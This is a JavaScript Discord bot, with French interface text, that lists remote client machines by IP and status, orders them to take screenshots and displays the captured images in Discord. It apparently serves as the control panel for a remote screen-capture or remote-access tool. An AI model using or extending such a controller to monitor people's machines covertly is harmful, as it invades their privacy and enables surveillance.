import { Client, GatewayIntentBits, EmbedBuilder, ButtonBuilder, ActionRowBuilder, StringSelectMenuBuilder,
    AttachmentBuilder } from 'discord.js';
import config from './config.json' assert {type: 'json'};
import axios from "axios";
import {commands} from './commands.js';

const { TOKEN, API_BASE_URL } = config;
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on('ready', () => {
    console.log(`Connecté en tant que ${client.user.tag}!`);
    client.user.setActivity('/help');
});

const handleHelpCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    const embed = new EmbedBuilder()
        .setTitle('Help')
        .setDescription('Voici la liste des commandes disponibles :')
        .addFields(commands.map(command => ({
            name: `/${command.name}`,
            value: command.description,
        })))
        .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
};

const handleScreenshotCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    await interaction.deferReply({ ephemeral: true });
    axios.post(`${API_BASE_URL}/command/${clientId}`, { command: 'screenshot' })
        .then(response => {
            interaction.editReply(`${response.data.message}`);
        })
        .catch(error => {
            console.error("Erreur lors de l'envoi de la commande", error);
            interaction.editReply("Erreur lors de l'envoi de la commande.");
        });
};

const handleClientsCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });

    const statusFilter = interaction.options.getString('status');
    const url = `${API_BASE_URL}/clients${statusFilter ? `?status=${statusFilter}` : ''}`;

    try {
        const response = await axios.get(url);
        const clients = response.data.clients;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }

        if (statusFilter) {
            const color = statusFilter === 'online' ? '#00FF00' : '#FF0000';
            const status = statusFilter === 'online' ? 'EN LIGNE' : 'HORS LIGNE';
            const embed = new EmbedBuilder()
                .setTitle(`Clients ${status}`)
                .setDescription(clients.map(client =>
                    `**${client.name || 'Client sans nom'} / ${client.ip}**\n
                    **Créé le :** ${client.date_created}
                    **Mis à jour le :** ${client.date_updated}`
                ).join('\n\n'))
                .setColor(color)
                .setTimestamp();

            await interaction.editReply({ embeds: [embed] });
        } else {
            const onlineClients = clients.filter(client => client.status === 'online');
            const offlineClients = clients.filter(client => client.status === 'offline');

            const embeds = [];

            if (onlineClients.length > 0) {
                embeds.push(new EmbedBuilder()
                    .setTitle('Clients EN LIGNE')
                    .setDescription(onlineClients.map(client =>
                        `**${client.name || 'Client sans nom'} / ${client.ip}**\n
                        **Créé le :** ${client.date_created}
                        **Mis à jour le :** ${client.date_updated}`
                    ).join('\n\n'))
                    .setColor('#00FF00')
                    .setTimestamp());
            }

            if (offlineClients.length > 0) {
                embeds.push(new EmbedBuilder()
                    .setTitle('Clients HORS LIGNE')
                    .setDescription(offlineClients.map(client =>
                        `**${client.name || 'Client sans nom'} / ${client.ip}**\n
                        **Créé le :** ${client.date_created}
                        **Mis à jour le :** ${client.date_updated}`
                    ).join('\n\n'))
                    .setColor('#FF0000')
                    .setTimestamp());
            }

            await interaction.editReply({ embeds: embeds });
        }
    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
};

const handleStopCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    await interaction.editReply('Arrêt du bot...');
    process.exit(0);
};

const handleListAllScreenshotsCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    axios.get(`${API_BASE_URL}/clients`)
        .then(response => {
            const clients = response.data.clients;
            if (clients.length === 0) {
                interaction.editReply("Aucun client disponible.");
                return;
            }

            const buttons = clients.map(client =>
                new ButtonBuilder()
                    .setCustomId(`client_${client.id}`)
                    .setLabel(`${client.name || 'Client sans nom'} / ${client.ip}`)
                    .setStyle(1)
            );

            // Création des lignes d'actions avec 5 boutons maximum par ligne (limite Discord)
            const components = buttons.slice(0, 5).map(button => new ActionRowBuilder().addComponents(button));

            interaction.editReply({ content: "Selectionnez un client pour voir les captures d'écran :", components });
        })
        .catch(error => {
            console.error("Erreur lors de la récupération des clients", error);
            interaction.editReply("Erreur lors de la récupération des clients.");
        });
};


client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        switch (interaction.commandName) {
            case 'help':
                await handleHelpCommand(interaction);
                break;
            case 'screenshot':
                await handleScreenshotCommand(interaction);
                break;
            case 'clients':
                await handleClientsCommand(interaction);
                break;
            case 'stop':
                await handleStopCommand(interaction);
                break;
            case 'listallscreenshots':
                await handleListAllScreenshotsCommand(interaction);
                break;
        }
    } else if (interaction.isButton()) {
        const clientId = interaction.customId.split('_')[1];
        axios.get(`${API_BASE_URL}/screenshot/client/${clientId}`)
            .then(response => {
                const screenshots = response.data.screenshots;
                if (screenshots.length === 0) {
                    interaction.update("Aucune capture d'écran disponible pour ce client.");
                    return;
                }

                const options = screenshots.map(screenshot => ({
                    label: `Capture d\'écran ${screenshot.id}`,
                    description: `Le ${screenshot.date_created}`,
                    value: screenshot.id.toString(),
                }));

                const selectMenu = new StringSelectMenuBuilder()
                    .setCustomId("select_screenshot")
                    .setPlaceholder("Selectionnez une capture d'écran")
                    .addOptions(options.slice(0, 25)); // Discord limit of 25 options

                const row = new ActionRowBuilder().addComponents(selectMenu);

                interaction.update({ content: "Selectionnez une capture d'écran :", components: [row] });
            })
            .catch(error => {
                console.error("Erreur lors de la récupération des captures d'écran pour ce client", error);
                interaction.update({ content: "Erreur lors de la récupération des captures d'écran pour ce client." });
            });
        } else if (interaction.customId === "select_screenshot") {
            const screenshotId = interaction.values[0];
            axios
                .get(`${API_BASE_URL}/screenshot/image/${screenshotId}`, {
                    responseType: "arraybuffer",
                })
                .then((response) => {
                    const imageBuffer = Buffer.from(response.data, "binary");
                    const attachment = new AttachmentBuilder(imageBuffer, {
                        name: "screenshot.png",
                    });

                    const embed = new EmbedBuilder()
                        .setTitle("Capture d'écran")
                        .setDescription("Voici la capture d'écran :")
                        .setImage("attachment://screenshot.png");

                    interaction.update({
                        content: "Voici la capture d'écran :",
                        files: [attachment],
                        embeds: [embed],
                        components: [],
                    });
                })
                .catch((error) => {
                    console.error("Erreur lors de la récupération de l'image de la capture d'écran", error);
                    interaction.update({
                        content: "Erreur lors de la récupération de l'image de la capture d'écran.",
                        components: [],
                    });
                });
        }
});

client.login(TOKEN);